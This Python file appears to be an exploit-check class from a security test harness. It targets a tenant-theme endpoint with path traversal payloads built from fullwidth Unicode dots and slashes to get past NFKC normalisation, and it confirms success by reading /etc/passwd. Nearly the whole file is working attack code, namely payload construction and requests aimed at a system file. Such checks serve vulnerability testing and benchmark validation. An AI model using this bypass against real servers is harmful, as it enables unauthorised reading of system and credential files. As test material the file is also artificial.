"""Hasura port: NFKC path traversal (CWE-22). Mirror of gin Diamond."""

from __future__ import annotations

from urllib.parse import quote

from mosaic.oracle.exploit import ExploitTest


_FW_DOT = "\uFF0E"
_FW_SLASH = "\uFF0F"


class HasuraNfkcExploit(ExploitTest):
    @property
    def chain_id(self) -> str:
        return "hasura_path_normalize_unicode"

    def execute(self) -> tuple[bool, str]:
        baseline = self.http_get("/tenant-theme/style.css")
        if not baseline.ok:
            return False, f"tenant-theme endpoint missing (status={baseline.status_code})"

        payload = f"{_FW_DOT*2}{_FW_SLASH}{_FW_DOT*2}{_FW_SLASH}etc{_FW_SLASH}passwd"
        r = self.http_get("/tenant-theme/" + quote(payload, safe=""), follow_redirects=False)
        body = r.text or ""
        if "root:" in body and ":/root" in body:
            return True, f"NFKC traversal confirmed (hasura, CWE-22). Body: {body[:200]!r}"

        payload2 = f"{_FW_DOT*2}{_FW_SLASH}etc{_FW_SLASH}passwd"
        r2 = self.http_get("/tenant-theme/" + quote(payload2, safe=""), follow_redirects=False)
        if "root:" in (r2.text or ""):
            return True, f"NFKC traversal confirmed (shorter). Body: {r2.text[:200]!r}"

        return False, f"No traversal. statuses={r.status_code}/{r2.status_code}"
